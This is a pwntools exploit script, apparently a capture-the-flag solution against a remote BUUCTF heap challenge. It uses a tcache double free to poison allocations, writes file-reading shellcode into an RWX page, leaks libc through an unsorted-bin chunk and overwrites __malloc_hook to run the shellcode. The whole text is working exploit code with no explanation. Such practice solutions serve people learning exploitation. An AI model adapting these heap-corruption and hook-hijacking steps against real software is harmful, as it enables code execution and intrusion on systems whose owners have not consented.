from pwn import *
context.arch='amd64'

def add(size):
    io.recvuntil('Choice:')
    io.sendline('1')
    io.recvuntil('size:')
    io.sendline(str(size))

def show(idx):
    io.recvuntil('Choice:')
    io.sendline('2')
    io.recvuntil('id:')
    io.sendline(str(idx))    

def free(idx):
    io.recvuntil('Choice:')
    io.sendline('4')
    io.recvuntil('id:')
    io.sendline(str(idx))

def edit(idx,data):
    io.recvuntil('Choice:')
    io.sendline('3')
    io.recvuntil('id:')
    io.sendline(str(idx))
    io.recvuntil('content:')
    io.send(data)

io=remote('node3.buuoj.cn',25705)

add(0x100)#0
add(0x100)#1

free(1)
free(1)
#1_chunk
show(1)
io.recvuntil('content: ')
first_chunk=u64(io.recv(6).ljust(8,'\x00'))
tcache_entry=first_chunk-0x198-0x110
print(hex(tcache_entry))

add(0x100)#2
edit(2,p64(tcache_entry))
add(0x100)#3 
add(0x100)#4 get tcache_entry
rwx_add=0x66660000
edit(4,p64(rwx_add))
add(0x100) #5 get rwx
#write shellcode
shellcode=shellcraft.amd64.open('flag')
shellcode+=shellcraft.amd64.read(3,0x66660300,64)
shellcode+=shellcraft.amd64.write(1,0x66660300,64)
edit(5,asm(shellcode))

#unsortbin attack
free(0)
show(0)
io.recvuntil('content: ')
libc_base=u64(io.recv(6).ljust(8,'\x00'))-0x3ebca0
print(hex(libc_base))
#malloc_hijack
malloc_hook=libc_base+0x3ebc30
edit(4,p64(malloc_hook))
add(0x100) #6 get malloc_hook
edit(6,p64(rwx_add))

#getshell
add(0x100)
io.interactive()